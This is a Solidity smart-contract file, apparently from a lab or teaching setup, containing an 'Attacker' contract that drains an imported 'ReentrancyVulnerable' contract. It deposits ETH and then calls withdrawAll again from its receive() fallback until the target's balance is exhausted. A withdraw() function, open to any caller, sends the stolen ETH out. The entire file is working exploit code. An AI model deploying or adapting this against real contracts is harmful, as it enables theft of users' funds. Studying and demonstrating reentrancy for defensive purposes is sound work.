// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ReentrancyVulnerable.sol";

contract Attacker {
    ReentrancyVulnerable public vulnerableContract;
    uint256 public attackAmount;

    constructor(address _vulnerableContract) {
        vulnerableContract = ReentrancyVulnerable(_vulnerableContract);
    }

    // Function to start the attack
    function attack() external payable {
        require(msg.value > 0, "Need ETH to attack");
        attackAmount = msg.value;
        
        // Initial deposit
        vulnerableContract.deposit{value: msg.value}();
        
        // Start the reentrancy attack
        vulnerableContract.withdrawAll();
    }

    // Fallback function that gets called when receiving ETH
    receive() external payable {
        // If there's still balance in the vulnerable contract, keep attacking
        if (address(vulnerableContract).balance >= attackAmount) {
            vulnerableContract.withdrawAll();
        }
    }

    // Function to withdraw stolen funds
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    // Helper function to check contract's balance
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
} 